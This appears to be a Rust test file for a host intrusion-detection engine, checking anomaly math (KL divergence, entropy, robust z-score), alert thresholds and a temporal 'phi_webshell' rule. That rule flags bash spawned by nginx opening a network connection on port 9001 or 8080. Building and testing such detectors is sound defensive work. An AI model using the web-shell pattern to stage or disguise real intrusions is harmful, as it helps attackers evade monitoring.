// AC-DET-031 AC-DET-032 AC-DET-033
fn anomaly_math_matches_probability_and_kl_formulas() {
    use crate::math::{distributions, kl_divergence_bits};

    let mut counts = HashMap::new();
    counts.insert(EventClass::ProcessExec, 3);
    counts.insert(EventClass::NetworkConnect, 1);
    let total = 4usize;

    let mut baseline = HashMap::new();
    baseline.insert(EventClass::ProcessExec, 2.0);
    baseline.insert(EventClass::NetworkConnect, 1.0);

    let alpha = 1.0;
    let (p, q) = distributions(&counts, total, &baseline, alpha);

    let idx_proc = EVENT_CLASSES
        .iter()
        .position(|c| *c == EventClass::ProcessExec)
        .expect("proc index");
    let idx_net = EVENT_CLASSES
        .iter()
        .position(|c| *c == EventClass::NetworkConnect)
        .expect("net index");

    assert!((p[idx_proc] - 0.75).abs() < 1e-9);
    assert!((p[idx_net] - 0.25).abs() < 1e-9);

    let denom = 3.0 + alpha * EVENT_CLASSES.len() as f64;
    assert!((q[idx_proc] - ((2.0 + alpha) / denom)).abs() < 1e-9);
    assert!((q[idx_net] - ((1.0 + alpha) / denom)).abs() < 1e-9);

    let expected_kl: f64 = p
        .iter()
        .zip(&q)
        .filter(|(pi, qi)| **pi > 0.0 && **qi > 0.0)
        .map(|(pi, qi)| pi * (pi / qi).log2())
        .sum();
    let kl = kl_divergence_bits(&p, &q);
    assert!((kl - expected_kl).abs() < 1e-12);
}

#[test]
// AC-DET-020 AC-DET-021 AC-DET-027 AC-DET-086
fn temporal_engine_enforces_stage_window() {
    let mut t = TemporalEngine::with_default_rules();

    let mut e1 = event(100, EventClass::ProcessExec, "bash", "nginx", 33);
    e1.pid = 300;
    assert!(t.observe(&e1).is_empty());

    let mut e2 = event(111, EventClass::NetworkConnect, "bash", "nginx", 33);
    e2.pid = 300;
    e2.dst_port = Some(8080);

    let hits = t.observe(&e2);
    assert!(hits.iter().all(|h| h != "phi_webshell"));
}

#[test]
// AC-DET-028
fn temporal_engine_accepts_events_within_reorder_tolerance() {
    let mut t = TemporalEngine::with_default_rules();

    let mut e1 = event(100, EventClass::ProcessExec, "bash", "nginx", 33);
    e1.pid = 301;
    assert!(t.observe(&e1).is_empty());

    let mut e2 = event(98, EventClass::NetworkConnect, "bash", "nginx", 33);
    e2.pid = 301;
    e2.dst_port = Some(9001);

    let hits = t.observe(&e2);
    assert!(hits.iter().any(|h| h == "phi_webshell"));
}

#[test]
// AC-DET-042
fn anomaly_entropy_guard_requires_minimum_length() {
    let mut engine = AnomalyEngine::default();

    let mut ev = event(1, EventClass::ProcessExec, "python", "bash", 1000);
    ev.command_line = Some("A".repeat(39));

    let out = engine.observe(&ev);
    assert!(out.is_none());
}

#[test]
// AC-DET-041
fn entropy_math_matches_shannon_definition() {
    let entropy = crate::math::shannon_entropy_bits("aaab");
    let expected = -(0.75f64 * 0.75f64.log2() + 0.25f64 * 0.25f64.log2());
    assert!((entropy - expected).abs() < 1e-12);
}

#[test]
#[cfg_attr(miri, ignore = "long-stream anomaly churn test is too slow under miri")]
// AC-DET-040 AC-DET-103
fn anomaly_monitor_state_remains_memory_bounded_under_long_streams() {
    let mut engine = AnomalyEngine::new(AnomalyConfig {
        window_size: 32,
        entropy_history_limit: 64,
        min_entropy_len: 8,
        ..AnomalyConfig::default()
    });

    for i in 0..10_000i64 {
        let mut ev = event(i, EventClass::ProcessExec, "python", "bash", 1000);
        ev.command_line = Some(format!("Ab9$Xy2!Qw8#Tn6@{i:04}"));
        let _ = engine.observe(&ev);
    }

    let history_len = engine.debug_entropy_history_len("python");
    assert!(history_len <= 64);

    let pending_window = engine.debug_window_sample_count("python:bash");
    assert!(pending_window < 32);

    let approx_bytes = history_len * std::mem::size_of::<f64>();
    assert!(approx_bytes < 1_000_000);
}

#[test]
// AC-DET-044
fn robust_zscore_uses_median_and_mad_baseline() {
    let history: VecDeque<f64> = (1..=11).map(|v| v as f64).collect();
    let z = crate::math::robust_z(12.0, &history);
    let expected = (12.0 - 6.0) / (1.4826 * 3.0);
    assert!((z - expected).abs() < 1e-9);
}

#[test]
// AC-DET-045
fn entropy_flag_policy_requires_min_len_entropy_and_zscore_conditions() {
    let mut engine = AnomalyEngine::new(AnomalyConfig {
        window_size: 128,
        min_entropy_len: 8,
        entropy_threshold: 3.5,
        entropy_z_threshold: 2.0,
        ..AnomalyConfig::default()
    });

    let mut short = event(1, EventClass::ProcessExec, "python", "bash", 1000);
    short.command_line = Some("abcd".to_string());
    assert!(engine.observe(&short).is_none());

    for i in 0..10 {
        let mut low = event(2 + i, EventClass::ProcessExec, "python", "bash", 1000);
        low.command_line = Some("aaaaaaaa".to_string());
        assert!(engine.observe(&low).is_none());
    }

    let mut high = event(10, EventClass::ProcessExec, "python", "bash", 1000);
    high.command_line = Some("Ab9$Xy2!Qw8#Tn6@".to_string());
    let out = engine
        .observe(&high)
        .expect("high-entropy spike should alert");
    assert!(out.high);
    assert!(out.entropy_bits.unwrap_or_default() > 3.5);
    assert!(out.entropy_z.unwrap_or_default() > 2.0);
}

#[test]
// AC-DET-034
fn anomaly_engine_emits_medium_when_above_medium_threshold_only() {
    let config = AnomalyConfig {
        window_size: 32,
        tau_floor_high: 10.0,
        tau_floor_med: 0.01,
        delta_high: 1.0,
        delta_med: 1.0,
        ..AnomalyConfig::default()
    };
    let mut engine = AnomalyEngine::new(config);

    for i in 0..32 {
        let ev = event(i, EventClass::ProcessExec, "python", "bash", 1000);
        let out = engine.observe(&ev);
        if i == 31 {
            let decision = out.expect("medium anomaly at window close");
            assert!(!decision.high);
            assert!(decision.medium);
        } else {
            assert!(out.is_none());
        }
    }
}

#[test]
// AC-DET-065
fn confidence_policy_is_first_match_wins() {
    let s = DetectionSignals {
        z1_exact_ioc: true,
        z2_temporal: true,
        z3_anomaly_high: true,
        z3_anomaly_med: true,
        z4_kill_chain: true,
        l1_prefilter_hit: true,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
    };
    assert_eq!(confidence_policy(&s), Confidence::Definite);

    let s = DetectionSignals {
        z1_exact_ioc: false,
        z2_temporal: true,
        z3_anomaly_high: true,
        z3_anomaly_med: true,
        z4_kill_chain: false,
        l1_prefilter_hit: true,
        exploit_indicator: false,
        kernel_integrity: false,
        tamper_indicator: false,
    };
    assert_eq!(confidence_policy(&s), Confidence::VeryHigh);
}

#[test]
#[cfg_attr(miri, ignore = "sqlite FFI is unsupported under miri")]
fn layer1_prefilter_negative_short_circuits_to_clean() {
    let mut l1 = IocLayer1::new();
    let store = IocExactStore::in_memory().expect("in-memory sqlite store");
    store
        .load_hashes(["hash-only-in-store".to_string()])
        .expect("load sqlite hash");
    l1.set_exact_store(store);

    assert_eq!(l1.check_hash("hash-only-in-store"), Layer1Result::Clean);
}
